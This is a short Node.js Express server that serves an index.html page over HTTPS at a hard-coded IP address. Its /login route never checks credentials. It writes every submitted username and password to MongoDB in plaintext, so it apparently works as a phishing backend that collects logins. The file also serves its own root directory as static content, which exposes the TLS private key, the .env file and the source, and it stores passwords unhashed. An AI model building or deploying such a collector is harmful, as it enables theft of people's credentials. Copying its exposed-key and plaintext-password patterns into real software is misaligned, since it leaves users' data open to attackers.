const express = require("express");
const path = require("path");
const fs = require("fs");
const https = require("https");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();

// Middleware
app.use(bodyParser.json());

// MongoDB connection
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
.then(() => console.log("✅ MongoDB connected successfully!"))
.catch((err) => console.error("❌ MongoDB connection error:", err));

// User Schema
const userSchema = new mongoose.Schema({
    username: String,
    password: String
});
const User = mongoose.model('User', userSchema);

// Load SSL Certificate & Key
const options = {
    key: fs.readFileSync(path.join(__dirname, "server.key")),
    cert: fs.readFileSync(path.join(__dirname, "server.cert")),
};

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname))); // Serve from the root directory where index.html is

// Serve index.html explicitly from the root path
app.get("/", (req, res) => {
    const filePath = path.join(__dirname, "index.html");
    console.log("__dirname:", __dirname);
    console.log("Serving file:", filePath);
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error("File sending error:", err);
            res.status(err.status || 500).end();
        }
    });
});

// Login API
app.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = new User({ username, password });
        await user.save();
        res.json({ message: "Login saved successfully!" });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: "Error saving login." });
    }
});

// Start HTTPS server
https.createServer(options, app).listen(3000, "0.0.0.0", () => {
    console.log("🚀 Secure server running at https://51.21.70.132:3000");
});
